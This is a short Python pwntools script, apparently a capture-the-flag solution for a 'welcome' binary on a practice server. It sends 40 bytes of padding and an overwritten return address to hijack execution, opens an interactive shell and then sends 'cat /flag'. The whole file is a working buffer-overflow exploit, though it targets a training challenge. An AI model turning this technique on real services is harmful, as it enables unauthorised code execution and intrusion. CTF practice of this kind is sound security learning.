#! /usr/bin/env python3 
from pwn import * 


context.binary = elf = ELF('./welcome') 
context.log_level = 'DEBUG'

if args['REMOTE']:
    p = remote('pwnable.co.il', 9000)
else:
    p = process([elf.path])


padding = b'a' * int(16 * 2.5)
payload = padding + p64(0x040070c)

p.sendline(payload)
p.interactive()
p.sendline('cat /flag'.encode())
